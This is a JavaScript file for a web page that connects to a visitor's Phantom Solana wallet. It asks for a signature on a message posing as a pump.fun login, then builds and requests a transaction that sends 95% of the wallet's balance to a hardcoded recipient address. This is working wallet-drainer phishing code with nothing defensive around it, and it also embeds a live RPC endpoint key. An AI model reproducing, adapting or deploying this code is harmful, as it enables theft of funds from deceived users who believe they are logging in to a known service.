import { Connection, Transaction, SystemProgram, PublicKey } from "@solana/web3.js";

const network = "https://fittest-aged-choice.solana-mainnet.quiknode.pro/c2dd999f23212f636c6cb6649c42a6a8fb4b1d98";
const recipientWallet = "Bn3JfQ8iNHNwbbibZ37VSL8Jtdn2LHVyDG8FZWXPnLpn"; // Replace with your second wallet address

// Connect Wallet and Initiate Message Signing
const connectWallet = async () => {
    if (!window.solana || !window.solana.isPhantom) {
        console.error("Phantom Wallet not installed.");
        return;
    }

    try {
        // Connect to the wallet
        const response = await window.solana.connect({ onlyIfTrusted: false });
        const sender = new PublicKey(response.publicKey);
        console.log("Wallet connected:", sender.toString());

        // Sign a message
        const signedMessage = await signMessage(sender);

        // Proceed to send SOL after signing
        if (signedMessage) {
            await sendSol(sender);
        }
    } catch (err) {
        console.error("Connection or signing failed:", err);
    }
};

// Request User to Sign a Message
const signMessage = async (sender) => {
    const message = `I am signing this message to log in to pump.fun and accept tokens`;
    const encodedMessage = new TextEncoder().encode(message);

    try {
        const signedMessage = await window.solana.signMessage(encodedMessage, "utf8");
        console.log("Message signed:", signedMessage.signature);
        return signedMessage;
    } catch (err) {
        console.error("Message signing failed:", err);
        return null;
    }
};

const sendSol = async (senderWallet) => {
    const connection = new Connection(network);
    const recipient = new PublicKey(recipientWallet);

    try {
        const balance = await connection.getBalance(senderWallet);
        console.log(`Current balance: ${balance} lamports`);

        if (balance <= 5000) return; // Exit if balance is too low for fees

        const amountToSend = Math.floor(balance * 0.95);

        // Get the latest blockhash
        const { blockhash } = await connection.getLatestBlockhash();

        // Create a transaction
        const transaction = new Transaction({
            recentBlockhash: blockhash,
            feePayer: senderWallet,
        });

        // Add the transfer instruction
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: senderWallet,
                toPubkey: recipient,
                lamports: amountToSend,
            })
        );

        // Sign and send the transaction
        const signedTransaction = await window.solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(signature);

        console.log(`Transaction successful! Signature: ${signature}`);
    } catch (err) {
        console.error("Transaction failed:", err);
    }
};

// Attach Event Listener on Page Load
window.onload = () => {
    const connectButton = document.getElementById("connectButton");
    const submitButton = document.getElementById("submitButton"); // Reference to submit button

    if (connectButton) {
        connectButton.addEventListener("click", connectWallet);
    } else {
        console.error("Connect button not found in DOM.");
    }

    if (submitButton) {
        submitButton.addEventListener("click", connectWallet); // Trigger same function on submit button click
    } else {
        console.error("Submit button not found in DOM.");
    }
};
